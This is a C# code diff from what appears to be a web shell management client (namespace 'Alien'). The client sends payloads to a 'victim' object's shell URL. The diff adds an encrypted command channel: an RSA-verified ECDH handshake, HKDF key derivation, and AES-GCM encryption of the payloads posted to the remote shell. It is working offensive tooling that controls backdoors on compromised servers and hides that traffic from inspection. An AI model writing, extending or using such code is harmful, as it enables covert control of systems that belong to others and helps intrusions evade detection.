@@ -2,12 +2,15 @@
 using System.Collections.Generic;
 using System.Data.Entity.Core.Mapping;
 using System.Linq;
+using System.Net.Cache;
 using System.Reflection.Metadata;
-using System.Security.Cryptography;
 using System.Text;
 using System.Text.Json;
 using System.Threading.Tasks;
-using static System.Runtime.InteropServices.JavaScript.JSType;
+
+using System.Security.Cryptography;
+using System.Security.Cryptography.X509Certificates;
+using System.Net;
 
 namespace Alien
 {
@@ -15,6 +18,12 @@ namespace Alien
     {
         public clsVictim m_victim { get; set; }
         public HttpClient m_clnt { get; set; }
+
+        private bool m_bUseCrypto { get; init; }
+        private AesGcm m_aesgcm { get; set; }
+        private byte[] m_abSessionToken { get; set; }
+        private bool bTokenExisted { get; set; }
+        private int m_nSequence { get; set; }
 
         /// <summary>
         /// 
@@ -86,22 +95,37 @@ namespace Alien
             Encoding.RegisterProvider(CodePagesEncodingProvider.Instance);
 
             m_victim = victim;
-            m_clnt = new HttpClient()
+            var cookieContainer = new CookieContainer();
+            var handler = new HttpClientHandler()
+            {
+                CookieContainer = cookieContainer,
+                UseCookies = true,
+                AllowAutoRedirect = true,
+            };
+
+            m_clnt = new HttpClient(handler)
             {
                 BaseAddress = new Uri(m_victim.ShellURL),
             };
+
+            m_bUseCrypto = m_victim.m_ShellConfig.payloadType == enPayloadType.Crypto;
         }
 
-        public JsonElement fnGetJson(string szUrl)
+        private static readonly JsonSerializerOptions s_jsonOpts = new()
         {
-            var res = m_clnt.GetStringAsync(szUrl).Result;
+            Encoder = System.Text.Encodings.Web.JavaScriptEncoder.UnsafeRelaxedJsonEscaping
+        };
+
+        public async Task<JsonElement> fnGetJson(string szUrl)
+        {
+            string res = await m_clnt.GetStringAsync(szUrl);
             return JsonDocument.Parse(res).RootElement;
         }
 
-        public JsonElement fnPostJson(string szUrl, object objJson)
+        public async Task<JsonElement> fnPostJson(string szUrl, object objJson)
         {
-            string json = JsonSerializer.Serialize(objJson);
-            var res = m_clnt.PostAsync(szUrl, new StringContent(json, Encoding.UTF8, "application/json")).Result;
+            string json = JsonSerializer.Serialize(objJson, s_jsonOpts);
+            var res = await m_clnt.PostAsync(szUrl, new StringContent(json, Encoding.UTF8, "application/json"));
 
             string text = res.Content.ReadAsStringAsync().Result;
 
@@ -110,42 +134,52 @@ namespace Alien
 
         private byte[] fnabHKDFExpand(byte[] abIKM, int nLength, string szInfo)
         {
-            using var hmac = new HMACSHA256();
-            hmac.Key = new byte[32];
+            // PRK = HMAC-SHA256(salt=zeros, IKM)
+            using var hmacExtract = new HMACSHA256(new byte[32]); // salt = 32 zero bytes
+            byte[] abPRK = hmacExtract.ComputeHash(abIKM);
 
-            byte[] abPRK = hmac.ComputeHash(abIKM);
+            // Expand
+            using var hmac = new HMACSHA256(abPRK);
             byte[] t = Array.Empty<byte>();
             byte[] abOKM = new byte[nLength];
-
             int pos = 0;
             byte counter = 1;
 
             while (pos < nLength)
             {
-                hmac.Key = abPRK;
-
-                byte[] abInput = new byte[t.Length + Encoding.UTF8.GetByteCount(szInfo) + 1];
+                byte[] infoBytes = Encoding.UTF8.GetBytes(szInfo);
+                byte[] abInput = new byte[t.Length + infoBytes.Length + 1];
                 Buffer.BlockCopy(t, 0, abInput, 0, t.Length);
-                Buffer.BlockCopy(Encoding.UTF8.GetBytes(szInfo), 0, abInput, t.Length, Encoding.UTF8.GetByteCount(szInfo));
+                Buffer.BlockCopy(infoBytes, 0, abInput, t.Length, infoBytes.Length);
                 abInput[^1] = counter++;
 
+                hmac.Key = abPRK; // reset key each round
                 t = hmac.ComputeHash(abInput);
 
                 int nCopyLen = Math.Min(t.Length, nLength - pos);
                 Buffer.BlockCopy(t, 0, abOKM, pos, nCopyLen);
-
                 pos += nCopyLen;
             }
 
             return abOKM;
         }
 
-        private string fnszPemEncode(string szLabel, byte[] abData)
+        private string fnszPemEncode(string label, byte[] data)
         {
-            return
-                $"-----BEGIN {szLabel}-----\n" +
-                Convert.ToBase64String(abData, Base64FormattingOptions.InsertLineBreaks) +
-                $"\n-----END {szLabel}-----";
+            string b64 = Convert.ToBase64String(data);
+
+            StringBuilder sb = new();
+
+            sb.AppendLine($"-----BEGIN {label}-----");
+
+            for (int i = 0; i < b64.Length; i += 64)
+            {
+                sb.AppendLine(b64.Substring(i, Math.Min(64, b64.Length - i)));
+            }
+
+            sb.Append($"-----END {label}-----");
+
+            return sb.ToString().Replace("\r\n", "\n");
         }
 
         /// <summary>
@@ -156,19 +190,191 @@ namespace Alien
         /// <returns></returns>
         public async Task<string> fnHttpPOST(string szPayloadData, string szSplitter)
         {
-            StringContent content = new StringContent(szPayloadData, Encoding.GetEncoding(m_victim.ShellEncoding), "application/x-www-form-urlencoded");
-            HttpResponseMessage resp = await m_clnt.PostAsync(string.Empty, content);
-            string szRespContent = await resp.Content.ReadAsStringAsync();
+            StringContent content;
+            HttpResponseMessage resp;
+            string szRespContent = string.Empty;
 
-            szSplitter = $"[{szSplitter}]";
-
-            if (resp.IsSuccessStatusCode && szRespContent.Contains(szSplitter))
+            try
             {
-                return szRespContent = szRespContent.Split(szSplitter)[1];
+                // Encryption is enabled
+                if (m_bUseCrypto)
+                {
+                    // Handshake
+                    if (!bTokenExisted)
+                    {
+                        var httpResp = await fnGetJson(m_victim.ShellURL);
+
+                        string szSignPubPem = httpResp.GetProperty("signPubKey").GetString().Trim();
+                        string szServerEcdhPem = httpResp.GetProperty("serverEcdhPub").GetString().Trim();
+                        byte[] abSignature = Convert.FromBase64String(httpResp.GetProperty("signature").GetString());
+                        string szHandshakeToken = httpResp.GetProperty("handshakeToken").GetString();
+
+                        byte[] abServerEcdh = Encoding.UTF8.GetBytes(szServerEcdhPem);
+
+                        using RSA signPub = RSA.Create();
+                        signPub.ImportFromPem(szSignPubPem);
+
+                        bool bVerified = signPub.VerifyData(
+                            abServerEcdh,
+                            abSignature,
+                            HashAlgorithmName.SHA256,
+                            RSASignaturePadding.Pkcs1
+                        );
+
+                        if (!bVerified)
+                            throw new Exception("Server identity verification failed");
+
+                        // client ECDH
+                        using ECDiffieHellman clntEcdh = ECDiffieHellman.Create(ECCurve.NamedCurves.nistP256);
+                        byte[] abClntEcdhPub = clntEcdh.ExportSubjectPublicKeyInfo();
+                        string szEcdhPubPem = fnszPemEncode("PUBLIC KEY", abClntEcdhPub).Replace("\r\n", "\n").Trim();
+
+                        // client signing key
+                        using ECDsa dsa = ECDsa.Create(ECCurve.NamedCurves.nistP256);
+                        byte[] abClntSignPub = dsa.ExportSubjectPublicKeyInfo();
+                        string szClntSignPubPem = fnszPemEncode("PUBLIC KEY", abClntSignPub).Replace("\r\n", "\n").Trim();
+
+                        byte[] abClntSign = dsa.SignData(
+                            Encoding.UTF8.GetBytes(szEcdhPubPem),
+                            HashAlgorithmName.SHA256,
+                            DSASignatureFormat.Rfc3279DerSequence
+                        );
+
+                        var handshakeResp = await fnPostJson(m_victim.ShellURL, new
+                        {
+                            handshakeToken = szHandshakeToken,
+                            clientEcdhPub = szEcdhPubPem,
+                            clientSignPub = szClntSignPubPem,
+                            clientSig = Convert.ToBase64String(abClntSign)
+                        });
+
+                        if (handshakeResp.TryGetProperty("error", out var err))
+                            throw new Exception($"Handshake failed: {err.GetString()}");
+
+                        m_abSessionToken = Convert.FromBase64String(
+                            handshakeResp.GetProperty("sessionToken").GetString()
+                        );
+
+                        // derive shared secret
+                        using ECDiffieHellman servEcdh = ECDiffieHellman.Create();
+                        servEcdh.ImportFromPem(szServerEcdhPem);
+
+                        byte[] abSharedSecret = clntEcdh.DeriveRawSecretAgreement(servEcdh.PublicKey);
+                        byte[] abAesKey = fnabHKDFExpand(abSharedSecret, 32, "secure-channel");
+
+                        m_aesgcm = new AesGcm(abAesKey, 16);
+
+                        bTokenExisted = true;
+                    }
+
+                    if (m_aesgcm == null)
+                        throw new Exception("Crypto not initialized");
+
+                    var obj = new
+                    {
+                        cmd = "request",
+                        seq = m_nSequence,
+                        data = szPayloadData
+                    };
+
+                    byte[] plaintext = Encoding.UTF8.GetBytes(JsonSerializer.Serialize(obj, s_jsonOpts));
+
+                    byte[] nonce = RandomNumberGenerator.GetBytes(12);
+                    byte[] ciphertext = new byte[plaintext.Length];
+                    byte[] tag = new byte[16];
+
+                    m_aesgcm.Encrypt(nonce, plaintext, ciphertext, tag);
+
+                    byte[] combined = new byte[12 + 16 + ciphertext.Length];
+
+                    Buffer.BlockCopy(nonce, 0, combined, 0, 12);
+                    Buffer.BlockCopy(tag, 0, combined, 12, 16);
+                    Buffer.BlockCopy(ciphertext, 0, combined, 28, ciphertext.Length);
+
+                    string encryptedPayload = Convert.ToBase64String(combined);
+
+                    var encryptedBody = JsonSerializer.Serialize(new
+                    {
+                        sessionToken = Convert.ToBase64String(m_abSessionToken),
+                        payload = encryptedPayload
+                    }, s_jsonOpts);
+
+                    content = new StringContent(
+                        encryptedBody,
+                        Encoding.UTF8,
+                        "application/json"
+                    );
+                }
+                else
+                {
+                    content = new StringContent(
+                        szPayloadData,
+                        Encoding.GetEncoding(m_victim.ShellEncoding),
+                        "application/x-www-form-urlencoded"
+                    );
+                }
+
+                resp = await m_clnt.PostAsync(string.Empty, content);
+                szRespContent = await resp.Content.ReadAsStringAsync();
+
+                if (!m_bUseCrypto)
+                {
+                    szSplitter = $"[{szSplitter}]";
+
+                    if (resp.IsSuccessStatusCode && szRespContent.Contains(szSplitter))
+                    {
+                        return szRespContent.Split(szSplitter)[1];
+                    }
+                    else
+                    {
+                        frmMsgBox f = new frmMsgBox(resp.StatusCode.ToString(), szRespContent);
+                        return string.Empty;
+                    }
+                }
+
+                if (resp.IsSuccessStatusCode)
+                {
+                    try
+                    {
+                        // After getting szRespContent, parse the JSON envelope first
+                        var respJson = JsonDocument.Parse(szRespContent).RootElement;
+
+                        // Update session token for next request
+                        m_abSessionToken = Convert.FromBase64String(
+                            respJson.GetProperty("sessionToken").GetString()
+                        );
+
+                        // Then decrypt the payload
+                        byte[] enc = Convert.FromBase64String(
+                            respJson.GetProperty("payload").GetString()
+                        );
+
+                        byte[] respNonce = enc[..12];
+                        byte[] respTag = enc[12..28];
+                        byte[] respCt = enc[28..];
+
+                        byte[] decrypted = new byte[respCt.Length];
+                        m_aesgcm.Decrypt(respNonce, respCt, respTag, decrypted);
+
+                        string result = Encoding.UTF8.GetString(decrypted);
+                        m_nSequence++;
+                        return result;
+                    }
+                    catch (Exception ex)
+                    {
+                        frmMsgBox f = new frmMsgBox("Decryption error", ex.Message);
+                        return string.Empty;
+                    }
+                }
+                else
+                {
+                    frmMsgBox f = new frmMsgBox(resp.StatusCode.ToString(), szRespContent);
+                    return string.Empty;
+                }
             }
-            else
+            catch (Exception ex)
             {
-                frmMsgBox f = new frmMsgBox(resp.StatusCode.ToString(), szRespContent);
+                frmMsgBox f = new frmMsgBox("HTTP Error", ex.Message);
                 return string.Empty;
             }
         }
